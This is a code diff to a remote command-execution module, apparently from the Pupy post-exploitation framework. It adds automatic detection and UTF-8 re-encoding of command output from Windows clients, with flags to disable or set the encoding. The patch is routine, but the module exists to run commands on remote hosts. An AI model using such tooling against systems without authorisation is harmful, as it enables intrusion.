@@ -8,6 +8,7 @@ from pupylib.PupyModule import (
 import datetime
 import subprocess
 import threading
+import chardet
 
 from argparse import REMAINDER
 
@@ -20,6 +21,8 @@ class PExec(PupyModule):
 
     terminate_pipe = None
     terminated = False
+    encoding = None
+    errors = None
 
     dependencies = ["pupyutils.safepopen"]
     io = REQUIRE_STREAM
@@ -36,6 +39,15 @@ class PExec(PupyModule):
             '-N',
             action='store_true',
             help='Don\'t receive stdout (read still be done on the other side)',
+        )
+        encodings = cls.arg_parser.add_mutually_exclusive_group()
+        encodings.add_argument(
+            '-E',
+            action='store_true',
+            help='Disable auto decoding',
+        )
+        encodings.add_argument(
+            '-e', help='Use encoding to decode stream',
         )
         cls.arg_parser.add_argument(
             '-s',
@@ -56,6 +68,11 @@ class PExec(PupyModule):
         if not args.arguments:
             self.error('No command specified {}'.format(args.__dict__))
             return
+
+        if args.E or not self.client.is_windows():
+            self.encoding = False
+        elif args.e:
+            self.encoding = args.e
 
         cmdargs = args.arguments
         safe_exec = self.client.remote('pupyutils.safepopen', 'safe_exec', False)
@@ -90,6 +107,25 @@ class PExec(PupyModule):
         close_event = threading.Event()
 
         def on_read(data):
+            if self.encoding is None:
+                try:
+                    if not self.encoding:
+                        encoding = chardet.detect(data)
+                        if encoding['confidence'] > 0.7 and \
+                          encoding['encoding'] != 'ascii':
+                            self.encoding = encoding['encoding']
+                except Exception, e:
+                    self.errors = e
+
+            if self.encoding:
+                try:
+                    data = data.decode(
+                        self.encoding
+                    ).encode('utf-8')
+                except UnicodeError, e:
+                    self.errors = e
+
+
             self.stdout.write(data)
 
         if type(cmdargs) == list:
